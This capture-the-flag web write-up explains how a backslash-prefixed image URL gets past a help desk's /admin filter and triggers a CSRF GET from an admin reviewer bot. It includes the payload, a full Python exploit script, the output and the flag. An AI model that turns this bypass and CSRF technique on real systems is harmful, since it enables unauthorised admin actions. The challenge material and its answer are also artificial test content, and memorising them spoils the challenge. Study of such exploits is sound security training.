---
title: "Some Surprises"
ctf: "Side CTF"
date: 2026-10-02
category: web
difficulty: medium
points: 0
flag_format: "0x1337{...}"
author: "shashankh.kanni"
---

# Some Surprises

## Summary

A support desk renders user tickets through a custom "Deskmark" markup. An automated
reviewer (holding an admin session) opens each escalated ticket in a real browser. The
Deskmark image filter blocks same-origin `/admin/*` URLs, but its path check and its HTML
output disagree: a leading backslash (`/\admin/...`) slips past the filter yet is emitted
as a clean `<img src="/admin/...">`. That image auto-loads in the reviewer's browser,
performing a CSRF GET against an admin-only endpoint. Resolving the ticket makes the admin
append a reply containing the flag, which the ticket owner can read back over the normal API.

## Background

Relevant routes (from `/openapi.json`):

- `POST /api/tickets` — file a ticket; body is Deskmark, rendered and stored.
- `GET /api/tickets/{id}` — read own ticket incl. rendered body and replies.
- `POST /api/tickets/{id}/escalate` — move a ticket into the reviewer queue.
- `GET /tickets/{id}/view` — the sanitized ticket rendered as a standalone page; exactly
  what the reviewer opens.
- `GET /admin/resolve|pin|archive/{id}` — internal, reviewer session only. **GET** verbs =
  CSRF-able.

Page CSP is strict (`default-src 'self'`, `script-src 'self'`), so stored XSS to JS
execution is out. But `img-src 'self'` still allows the browser to issue GETs to same-origin
`/admin/*` — if we can get such an `<img>` past the Deskmark filter.

## Solution

### Step 1: Find the filter/output mismatch

Deskmark links (`{text|url}`) only allow `http(s)://`. Images (`{img:alt|url}`) additionally
allow same-origin absolute paths (`/local.png`) — **except** anything starting with `/admin`,
which the filter drops. That block is the "No Surprises" guard.

The guard checks the raw string but normalizes the emitted `src`. Probing variants, only one
bypasses it:

```
{img:x|/\admin/pin/1}   =>   <img src="/admin/pin/1" alt="x">
```

The filter sees `/\admin/...` (does not match the `/admin` prefix, so it is allowed); the
renderer strips the backslash and outputs a clean same-origin `/admin/...` URL. The reviewer's
browser then requests it with the admin cookie attached.

### Step 2: CSRF the reviewer into resolving our ticket

The image needs the victim ticket id, which is only known after filing. So use two tickets:
file + escalate a victim, then file + escalate an attacker ticket whose image points at
`/admin/resolve/<victim>`. When the reviewer opens the attacker's `/view`, the image fires the
admin resolve on the victim, and the admin leaves a reply with the flag on the victim ticket.

```python
#!/usr/bin/env python3
import json, re, time, urllib.request

B = "http://40.81.242.56:30841"

def req(path, obj=None, cookie=""):
    data = json.dumps(obj).encode() if obj is not None else None
    r = urllib.request.Request(B + path, data=data, method="POST" if obj is not None else "GET",
                               headers={"Content-Type": "application/json", "Cookie": cookie})
    resp = urllib.request.urlopen(r)
    return resp, json.loads(resp.read() or b"{}")

# 1. establish a desk session (cookies come back on first POST)
resp, created = req("/api/tickets", {"subject": "init", "body": "hi"})
cookie = "; ".join(c.split(";", 1)[0] for c in resp.headers.get_all("Set-Cookie", []))

def file_ticket(body):
    _, d = req("/api/tickets", {"subject": "t", "body": body}, cookie)
    return d["id"]

def escalate(tid):
    req(f"/api/tickets/{tid}/escalate", {}, cookie)

def read(tid):
    _, d = req(f"/api/tickets/{tid}", None, cookie)
    return d

# 2. victim ticket to be resolved by the admin
victim = file_ticket("please review"); escalate(victim)

# 3. attacker ticket: backslash bypass -> <img src="/admin/resolve/<victim>">
attacker = file_ticket(f"look {{img:a|/\\admin/resolve/{victim}}}"); escalate(attacker)

# 4. wait for the reviewer bot, then read the flag off the victim ticket
for _ in range(60):
    for rep in read(victim)["replies"]:
        if "0x1337" in rep["text"]:
            print(rep["text"]); raise SystemExit
    time.sleep(10)
```

Output:

```
Reviewed and closed. 0x1337{4dm1n_r34d_1t_th3_1mg_t4g_d1d_th3_r3st}
```

## Flag

```
0x1337{4dm1n_r34d_1t_th3_1mg_t4g_d1d_th3_r3st}
```
